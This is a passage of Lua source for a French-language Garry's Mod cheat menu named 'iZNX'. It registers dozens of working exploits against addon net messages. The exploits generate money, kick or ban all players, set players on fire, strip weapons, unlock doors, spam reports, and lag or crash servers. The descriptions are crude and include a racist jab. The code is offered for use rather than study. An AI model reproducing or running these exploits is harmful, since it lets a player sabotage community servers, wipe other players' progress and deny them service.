for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ 3D Cardealer â‚¬", {
desc = "Exploit d'argent, Regarder un vehicule que vous avez acheté pour le dupliquer ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Dupliquer", func = function()
for i = 0, 75 do              
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );              
net.WriteTable( { E = ent } );                
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout Vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                
net.SendToServer()                
end      
end, },          
},
} )
iZNX.AddExploit( "Supprimer Armes / Argent (ultra rare)", {
desc = "Supprimer les armes / l'argent de touts le monde",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Supprimer Argent", func = function()
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Crafting Mod â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs(ultra rare)",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Teleportation", {
desc = "Teleport les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 2", {
desc = "Je sait pas ce que Ã§a fait (Ã§a fait surement respawn les joueurs que vous visez ou un truc comme Ã§a ^^'')",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do        
if v:GetClass() == "item_loot" then                
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')      
net.SendToServer()
iZNX.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "Tu peux mettre Anonymous en photo de profil maintenant.",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hacker", func = function()
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Kart System â‚¬", {
desc = "Exploit d'argent.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Farming Mod â‚¬", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Point Shop â‚¬", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Changer de skin",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1  
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Hitman X â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Bail Out â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Tow Truck â‚¬", {
desc = "Spawn vehicule dépanneur / Exploit d'argent Regarder le vehicule qui possÃ¨de une amande",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn Dépanneuse", func = function()
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Argent Exploit", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Spawn camion de pompier",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
iZNX.AddExploit( "â‚¬ Hit Menu â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))              
net.SendToServer()      
end, },
},
} )
iZNX.AddExploit( "â‚¬ HHH â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v  
end        
if dahater != plyhhh then      
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "Cette version de HHH n'est pas exploitable !" )    
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ DaHit â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam Prendre", func = function()
if !timer.Exists( "SeizedTeam_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "SeizedTeam_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end)
else
timer.Remove( "SeizedTeam_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
{ typ = "func", name = "Spam Enlever", func = function()
if !timer.Exists( "SeizedTeam_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "SeizedTeam_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )              
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )              
net.WriteEntity( v )              
net.WriteEntity( v )              
net.SendToServer()    
end
end)
else
timer.Remove( "SeizedTeam_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers Ã  proximité",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SeizedTeam_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer lancé" )
timer.Create( "SeizedTeam_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "SeizedTeam_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Munition Gratuit", {
desc = "Vous donne des munition pour toutes vos armes",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Advanced Money Printer â‚¬", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban tout le monde", {
desc = "Exploit pout bannir tout le monde sauf toi ^^, exploit trouvé dans une ancienne version de gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do              
if v != LocalPlayer() then      
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #1", {
desc = "L'admin devrait avoir honte de faire payer un VIP.",
severity = 2,
scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SeizedTeam_exploit_lagsploit1" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_lagsploit1" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Spam", {
desc = "Supposé Ãªtre un lag exploit mais ne provoque pas de lags, juste des spams console",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SeizedTeam_exploit_bigspames2" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u forget your promess forever but sorry you are a friend" )
end
end)
else
timer.Remove( "SeizedTeam_exploit_bigspames2" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #2", {
desc = "Clique pour mettre en position croque mcdo le fonda!",
severity = 1,
scan = function() return iZNX.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SeizedTeam_exploit_lagsploit4" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
iZNX.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_lagsploit4" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Faire lag le serveur comme s'il était hébergé en Afrique",
severity = 2,
scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SeizedTeam_exploit_lagsploit5" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
iZNX.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_lagsploit5" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #4", {
desc = "Il doit y en avoir des merdes dans ce serveur !",
severity = 2,
scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Big Lag", func = function()
if !timer.Exists( "SeizedTeam_exploit_lagsploit6" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
iZNX.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_lagsploit6" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #5", {
desc = "Faire crash un serveur sans props ? Mkprod en sueur!",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Big Lags", func = function()
if !timer.Exists( "SeizedTeam_exploit_lagsploit7" ) then
iZNX.ChatText( "Lag lancé" )
timer.Create( "SeizedTeam_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "SeizedTeam_exploit_lagsploit7" )
iZNX.ChatText( "Lag stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Réanimation Exploit", {
desc = "Vous etes automatiquement réanimé aprÃ¨s avoir été tué",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "SeizedTeam_exploit_zombie" ) then
iZNX.ChatText( "Tu es Immortel" )
timer.Create( "SeizedTeam_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_zombie" )
iZNX.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Prenez les armes de la police Ã  l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Proprio", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "SeizedTeam Report Spammer", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER PAR LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Fait instantanément Crash n'importe quel serveur exécutant la simplicité anticheat",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip les armes", {
desc = "Supprimer les armes de n'importes qui.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
